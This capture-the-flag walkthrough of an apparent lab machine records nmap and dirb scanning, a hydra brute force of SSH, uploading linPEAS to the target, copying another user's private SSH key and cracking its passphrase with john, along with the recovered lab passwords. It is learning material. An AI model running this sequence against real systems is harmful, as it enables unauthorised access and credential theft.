# Basic Pentest CTF

attack machine = 10.10.140.158

## Data Gathering

- Run a ping scan to insure machine is up
    `ping -c 3 10.10.140.158`

- Run nmap scan to discover services running
    `nmap -sC -sV -oN init_scan 10.10.140.158`

```console
└─$ nmap -sC -sV -oN init_scan 10.10.140.158
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 14:20 EDT
Nmap scan report for 10.10.140.158
Host is up (0.13s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy
| fingerprint-strings: 
|   Kerberos, TLSSessionReq: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Wed, 12 Oct 2022 18:22:20 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
```

- Run dirbuster to get info on potential directories for website
    `dirb http://10.10.140.158/ /usr/share/wordlists/dirb/common.txt`

```console
---- Scanning URL: http://10.10.140.158/ ----
==> DIRECTORY: http://10.10.140.158 development/                                                                    
+ http://10.10.140.158/index.html (CODE:200 SIZE:158)                                                               
+ http://10.10.140.158/server-status (CODE:403|SIZE:301)                                                            
```

discovered conversations under the /development directory

```vim
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

```vim
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP.

-K
```

- Run enum4linux to gather potential usernames that can help brute-force SMB.
    `enum4linux -a 10.10.140.158 | tee enum4linux.log`

based on infor gathered from the dev directory i found 2 usernames that could be useful _kay_ and _jan_.

- Run hydra to brute force SSH login using _jan_
    `hydra -Vf -l jan -P /usr/share/wordlists/rockyou.txt 10.10.140.158 ssh`

```console
[22][ssh] host: 10.10.140.158   login: jan   password: armando
```

- SSH into jan using login info
    `SSH jan@10.10.140.158`

- Do some enumeration to gather information

since we have ssh access we can do a secure copy (scp) of tools we could use such as linPEAS.

ATTACK MACHINE
_I downloaded the latest release of linpeas.sh into the directoy i was working in so i didn't need to provide a path. I copied the script to /dev/shm as its a means of passing data between programs_
`scp linpeas.sh jan@10.10.140.158:/dev/shm`

TARGET MACHINE
Once i know its properly copied over i insure the script is executable
    `chmod 777 linpeas.sh`

Then run the script
    `./linpeas.sh`

Going through the information, there is a possible private SSH key we can use for _kay_ which could give us access to there machine. pull the readable id_rsa key 
    
`cd /home/kay/.ssh`

open the file and copy it to a new file on your host machine. change permissions so only you can open it `chmod 600 kay_rsa_key`

Kay's SSH requires a passphrase which we don't have...
```console
└─$ ssh -i kay_rsa_key kay@10.10.140.158
Enter passphrase for key 'kay_rsa_key': 
```

We have to use john the ripper to brute-force our way in. first we need information related to the ssh key through john.
`ssh2john kay_rsa_key > kayforjohn.txt`

Then using that file we enter it into the main john the ripper with a wordlist.
`john kayforjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt`

```console
─$ john kayforjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt                                              1 ⚙
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_rsa_key)     
1g 0:00:00:00 DONE (2022-10-12 17:08) 25.00g/s 2068Kp/s 2068Kc/s 2068KC/s betzabeth..beba21
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- SSH into kay using the passphrase _beeswax_
    `SSH -i kay_rsa_key kay@10.10.140.158`

- Read the _pass.bak_ file for the password
*heresareallystrongpasswordthatfollowsthepasswordpolicy$$*
